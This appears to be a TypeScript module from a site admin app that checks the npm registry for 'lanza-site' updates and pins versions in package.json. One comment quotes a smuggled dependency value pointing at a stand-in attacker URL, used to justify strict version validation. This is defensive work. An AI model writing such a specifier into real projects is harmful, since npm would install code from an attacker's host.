// Which version of the site software this tenant runs, and whether a newer one
// exists. All the code (Astro site, Pages Functions, this admin app) ships as the
// `lanza-site` npm package; the tenant's package.json pins one exact version and
// Cloudflare installs it at build time. That pin is the whole update mechanism —
// changing it and rebuilding IS the update.
//
// The npm registry is the source of truth for what's available, so there is no
// extra service to run: it serves `dist-tags` and per-version publish times, and
// it sends `Access-Control-Allow-Origin: *`, so the browser reads it directly.
//
// Two dist-tags matter:
//   latest   — the newest release; an ordinary, optional update.
//   critical — the OLDEST version still considered safe. A tenant below this is
//              shown a security warning rather than a normal update offer, and
//              the broker's fan-out may bump them without asking.
import { ref } from "vue";
import { GitHubError, type GitHubClient } from "./github";
import { REPO } from "./config";

export const PACKAGE_NAME = "lanza-site";
const REGISTRY = `https://registry.npmjs.org/${PACKAGE_NAME}`;

export interface RegistryInfo {
  latest: string;
  /** Minimum safe version (the `critical` dist-tag), if the publisher set one. */
  critical: string | null;
  /** Every published version, newest first, with its publish time. */
  releases: { version: string; date: string | null }[];
}

export interface VersionState {
  /** Version the LIVE site builds from (production branch). */
  live: string | null;
  /** Version on the drafts branch — differs only when an update is staged. */
  staged: string | null;
  registry: RegistryInfo | null;
  /** This repo has no lanza-site dependency: a pre-package fork, not updatable. */
  unmanaged: boolean;
  /** Registry unreachable (offline, npm down) — state is unknown, not "current". */
  offline: boolean;
}

// The release that introduced this screen. Older versions have no update UI at
// all, so moving to one removes the only way back: the owner would have to edit
// package.json on GitHub by hand. Observed for real — a test site reverted to
// 0.1.1 and lost the button it needed to return.
//
// This is not a one-off fixed by time. Any revert that crosses a release which
// added UI loses that UI, so the guard is permanent even as the number ages.
export const SELF_UPDATE_SINCE = "0.1.3";

/** True if switching to `version` would leave the owner with no way back here. */
export function strandsOwner(version: string): boolean {
  return compareVersions(version, SELF_UPDATE_SINCE) < 0;
}

// A published version number, anchored at BOTH ends. The anchors are the whole
// point: this string becomes the VALUE of dependencies["lanza-site"], and npm
// reads that as a dependency SPECIFIER, not as a number. Proven with a hostile
// registry response —
//   "0.1.6 || https://evil.example/p.tgz"
// compares as newer than 0.1.5, clears the `critical` floor, and npm then installs
// the package from that URL. No tarball is ever published, so provenance has
// nothing to catch. JSON.stringify already escapes the value, so this is not JSON
// injection; the injection is semantic, into npm's dependency grammar.
//
// Duplicated in the broker (lanza-broker/functions/_lib/fanout.ts) for the same
// reason the comparator is — separate deployables, no shared package.
const SEMVER_RE = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/;

/** Is this a version number we are willing to write into a package.json? */
export function isVersion(v: unknown): v is string {
  return typeof v === "string" && SEMVER_RE.test(v);
}

// Prerelease identifiers, compared per semver §11: dot-separated, numeric ones
// numerically, numeric sorts below alphanumeric, and a shorter set sorts below a
// longer one with the same prefix. String comparison alone got `rc.10` below
// `rc.9` — the same lexical trap the 0.1.10 tests below already pin for the
// numeric segments.
function comparePrerelease(a: string, b: string): number {
  const as = a.split(".");
  const bs = b.split(".");
  for (let i = 0; i < Math.max(as.length, bs.length); i++) {
    const x = as[i];
    const y = bs[i];
    if (x === undefined) return -1;
    if (y === undefined) return 1;
    const xNum = /^\d+$/.test(x);
    const yNum = /^\d+$/.test(y);
    if (xNum && yNum) {
      const d = Number(x) - Number(y);
      if (d !== 0) return d < 0 ? -1 : 1;
    } else if (xNum !== yNum) {
      return xNum ? -1 : 1;
    } else if (x !== y) {
      return x < y ? -1 : 1;
    }
  }
  return 0;
}

/** Compare two dotted numeric versions. -1 / 0 / 1, like a sort comparator. */
export function compareVersions(a: string, b: string): number {
  // Prerelease suffixes (1.2.3-beta.1) sort BEFORE their release, per semver.
  // split(/-(.*)/) keeps the WHOLE suffix; split("-", 2) dropped everything past
  // the first hyphen, so 1.0.0-beta-1 and 1.0.0-beta-2 compared EQUAL.
  const [aMain, aPre = ""] = a.split(/-(.*)/);
  const [bMain, bPre = ""] = b.split(/-(.*)/);
  const an = aMain.split(".").map((n) => parseInt(n, 10) || 0);
  const bn = bMain.split(".").map((n) => parseInt(n, 10) || 0);
  for (let i = 0; i < Math.max(an.length, bn.length); i++) {
    const d = (an[i] ?? 0) - (bn[i] ?? 0);
    if (d !== 0) return d < 0 ? -1 : 1;
  }
  if (aPre && !bPre) return -1;
  if (!aPre && bPre) return 1;
  if (aPre && bPre) return comparePrerelease(aPre, bPre);
  return 0;
}

/**
 * The pinned version string, or null when this repo does not track a released
 * version of the package. A range prefix is stripped (we pin exact) and so is a
 * leading `v` — `v1.0.0` otherwise parsed to [0,0,0] and read as ancient.
 *
 * Anything that is not a version number after that — `file:../lanza`, a git URL,
 * `*`, `latest` — is deliberately null, i.e. UNMANAGED. It is a self-hoster or a
 * fork, not a site on a release, and the old code judged it version 0: below every
 * floor, so the CMS nagged and the broker's fan-out force-rewrote it. Reporting
 * "not updatable" is both true and what the broker now does (fanout.ts verdictFor).
 */
function pinnedVersion(pkg: Record<string, unknown>): string | null {
  const deps = pkg.dependencies as Record<string, string> | undefined;
  const raw = deps?.[PACKAGE_NAME];
  if (typeof raw !== "string") return null;
  const cleaned = raw.replace(/^[\^~>=<\s]+/, "").replace(/^v/, "");
  return isVersion(cleaned) ? cleaned : null;
}

async function readPin(client: GitHubClient, ref: string): Promise<string | null> {
  try {
    const { data } = await client.loadJson("package.json", ref);
    return pinnedVersion(data);
  } catch (e) {
    // A missing package.json means the same thing as a missing dependency here:
    // nothing to update. Anything else is a real failure worth surfacing.
    if (e instanceof GitHubError && e.status === 404) return null;
    throw e;
  }
}

export async function fetchRegistry(): Promise<RegistryInfo> {
  const res = await fetch(REGISTRY, { headers: { accept: "application/json" } });
  if (!res.ok) throw new Error(`npm registry returned ${res.status}`);
  const doc = (await res.json()) as {
    "dist-tags"?: Record<string, string>;
    versions?: Record<string, unknown>;
    time?: Record<string, string>;
  };
  const tags = doc["dist-tags"] ?? {};
  // Filter at the boundary: every key of `doc.versions` becomes a clickable Update
  // button and `latest`/`critical` drive the offer and the floor. A malformed tag
  // must read as ABSENT, not as a version — absent means no offer and no floor,
  // which is already the safe default everywhere below. See isVersion.
  const releases = Object.keys(doc.versions ?? {})
    .filter(isVersion)
    .sort((a, b) => compareVersions(b, a))
    .map((version) => ({ version, date: doc.time?.[version] ?? null }));
  return {
    latest: isVersion(tags.latest) ? tags.latest : "",
    critical: isVersion(tags.critical) ? tags.critical : null,
    releases,
  };
}

export async function loadVersionState(client: GitHubClient): Promise<VersionState> {
  const [live, staged] = await Promise.all([
    readPin(client, REPO.productionBranch),
    readPin(client, REPO.branch),
  ]);
  let registry: RegistryInfo | null = null;
  let offline = false;
  try {
    registry = await fetchRegistry();
  } catch {
    offline = true;
  }
  return { live, staged, registry, unmanaged: live === null && staged === null, offline };
}

/** True when a newer release than `current` exists. */
export function updateAvailable(state: VersionState): boolean {
  const current = state.staged ?? state.live;
  if (!current || !state.registry?.latest) return false;
  return compareVersions(state.registry.latest, current) > 0;
}

/** True when the running version is older than the `critical` floor. */
export function securityUpdateRequired(state: VersionState): boolean {
  const current = state.staged ?? state.live;
  const floor = state.registry?.critical;
  if (!current || !floor) return false;
  return compareVersions(current, floor) < 0;
}

// A version the publisher has marked unsafe — below the `critical` floor. The CMS
// must not offer to move ONTO one: after a forced security update, the version list
// would otherwise still invite the owner to walk straight back into it.
//
// This is a guard, not enforcement. The repo is theirs and they can edit
// package.json directly; the broker's fan-out is what actually holds the line, by
// moving them off it again. The UI's job is to not suggest it.
export function isUnsafeVersion(version: string, state: VersionState): boolean {
  const floor = state.registry?.critical;
  return !!floor && compareVersions(version, floor) < 0;
}

// The commit the broker writes when it force-updates a site (see the broker's
// api/admin/fanout.ts). Recognising it is how the CMS can explain a change the
// owner did not make — otherwise their version silently differs from what they set.
const FORCED_COMMIT = new RegExp(`^security: move ${PACKAGE_NAME} to (\\S+)`);

export function parseForcedUpdate(message: string): string | null {
  return FORCED_COMMIT.exec(message.trim())?.[1] ?? null;
}

/** The forced update that produced the running version, if that's what happened. */
export async function loadForcedUpdate(
  client: GitHubClient,
  current: string | null,
): Promise<{ version: string; date: string | null } | null> {
  if (!current) return null;
  try {
    // Only the newest commit touching package.json on the branch that builds the
    // live site. If the owner has changed their version since, this won't match and
    // no notice is shown — the message must describe the version they're ON.
    const [latest] = await client.listCommits(1, 1, {
      path: "package.json",
      ref: REPO.productionBranch,
    });
    if (!latest) return null;
    const forced = parseForcedUpdate(latest.commit?.message ?? "");
    if (!forced || forced !== current) return null;
    return { version: forced, date: latest.commit?.author?.date ?? null };
  } catch {
    // Explanatory chrome — never break the pane over it.
    return null;
  }
}

// App-wide copy of the state, so the sidebar can always show the running version
// (and flag an update) without every pane refetching. Loaded once at boot and
// after an update, exactly like the pending-publish count in ui/staging.ts.
export const versionState = ref<VersionState | null>(null);

export async function refreshVersionState(client: GitHubClient): Promise<void> {
  try {
    versionState.value = await loadVersionState(client);
  } catch {
    // Advisory chrome — never block the CMS on it.
    versionState.value = null;
  }
}

/**
 * Pin a different version on the drafts branch. Like every other CMS change this
 * is staged, not live: publishing merges it to the production branch, which is
 * what makes Cloudflare rebuild onto the new code.
 */
export async function setPinnedVersion(client: GitHubClient, version: string): Promise<void> {
  // Last gate before the write. fetchRegistry already filters, but this is the
  // function that puts a string into npm's dependency grammar, so it checks for
  // itself rather than trusting its caller — the value may have come from a
  // registry response, a route param or a future caller that has no idea.
  if (!isVersion(version)) {
    throw new Error(`Refusing to pin ${PACKAGE_NAME} to "${version}" — not a version number.`);
  }

  const { data, sha } = await client.loadJson("package.json", REPO.branch);
  const deps = (data.dependencies ?? {}) as Record<string, string>;
  if (deps[PACKAGE_NAME] === version) return;

  // Drop any committed lockfile FIRST. Cloudflare runs `npm ci` when one exists,
  // and `npm ci` refuses to install when the lock disagrees with package.json:
  //   Invalid: lock file's lanza-site@0.1.7 does not satisfy lanza-site@0.1.9
  // Nothing here ever regenerated the lock, so every update silently bricked the
  // build — the site kept serving its previous deployment, so from the outside the
  // update just appeared to do nothing. Sites created from the template no longer
  // carry a lockfile, but ones created before that do, and this is what frees them.
  //
  // Deleting BEFORE the version bump matters: the in-between commit is then
  // (old version, no lock), which builds fine. The other order leaves a commit
  // where the two disagree and fires a red build on the way past.
  await client.deleteFileIfExists(
    "package-lock.json",
    `lanza: remove package-lock.json so ${PACKAGE_NAME} updates can build`,
  );

  data.dependencies = { ...deps, [PACKAGE_NAME]: version };
  await client.saveJson("package.json", data, `lanza: use ${PACKAGE_NAME} ${version}`, sha);
}
